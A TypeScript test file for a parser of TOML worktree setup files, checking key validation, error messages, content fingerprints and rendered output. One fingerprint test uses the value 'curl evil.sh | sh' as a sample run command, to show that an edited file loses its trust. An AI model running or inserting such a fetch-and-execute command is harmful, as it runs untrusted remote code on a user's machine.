import { expect, test } from "bun:test";
import type { GardenError } from "./errors.ts";
import { fingerprintOf, parseSetupFile, renderSetupFile } from "./setup-file.ts";

/**
 * The file, as text. Everything here is about what a person could plausibly
 * write and what it should mean — the disk and git are `commands/setup.int.test.ts`.
 */

function caught(text: string): GardenError | undefined {
  try {
    parseSetupFile(text);
    return undefined;
  } catch (error) {
    return error as GardenError;
  }
}

test("the three keys, in the shape the file documents", () => {
  const plan = parseSetupFile(`
[setup]
copy = [".env", "local.properties"]
link = ["node_modules"]
run  = ["bun install", "bun run build"]
`);

  expect(plan.copy).toEqual([".env", "local.properties"]);
  expect(plan.link).toEqual(["node_modules"]);
  expect(plan.commands).toEqual(["bun install", "bun run build"]);
});

// What people write the first time, and a shape with exactly one sensible
// reading. Refusing it would be pedantry.
test("a single value need not be a list", () => {
  expect(parseSetupFile('[setup]\ncopy = ".env"\n').copy).toEqual([".env"]);
});

test("a file with no [setup] asks for nothing, and is not an error", () => {
  expect(parseSetupFile("# nothing here yet\n").copy).toEqual([]);
  expect(parseSetupFile("").commands).toEqual([]);
});

// The failure this file exists to prevent: a key nobody reads, doing nothing,
// found out weeks later from a worktree that would not build.
test("a misspelled key is refused rather than ignored", () => {
  const error = caught('[setup]\ncpoy = [".env"]\n');

  expect(error?.code).toBe("usage");
  expect(error?.message).toContain("cpoy");
  expect(error?.hint).toContain("copy");
});

test("a key that is not a list of strings says so", () => {
  expect(caught("[setup]\ncopy = 3\n")?.message).toContain("list of strings");
  expect(caught('[setup]\nrun = ["ok", 7]\n')?.message).toContain("list of strings");
  expect(caught("[setup]\nsetup = 1\n")?.code).toBe("usage");
});

test("TOML that is not TOML is reported as that, with git's own words kept", () => {
  const error = caught("[setup\ncopy = ");

  expect(error?.code).toBe("usage");
  expect(error?.message).toContain("not valid TOML");
  expect(error?.details.length).toBeGreaterThan(0);
});

// Contents, not the name or the date: editing the file withdraws the trust it
// was given, which is the whole of the mechanism.
test("the fingerprint follows the contents", () => {
  const one = fingerprintOf('[setup]\nrun = ["bun install"]\n');

  expect(fingerprintOf('[setup]\nrun = ["bun install"]\n')).toBe(one);
  expect(fingerprintOf('[setup]\nrun = ["curl evil.sh | sh"]\n')).not.toBe(one);
});

test("the proposed file writes the files and comments the directories out", () => {
  const text = renderSetupFile([".env"], ["node_modules"]);

  expect(text).toContain('copy = [".env"]');
  // Commented, because `link` shares one copy between every worktree and that
  // is right for a dependency cache and wrong for a build output.
  expect(text).toContain('# link = ["node_modules"]');
  expect(parseSetupFile(text).copy).toEqual([".env"]);
  expect(parseSetupFile(text).link).toEqual([]);
});
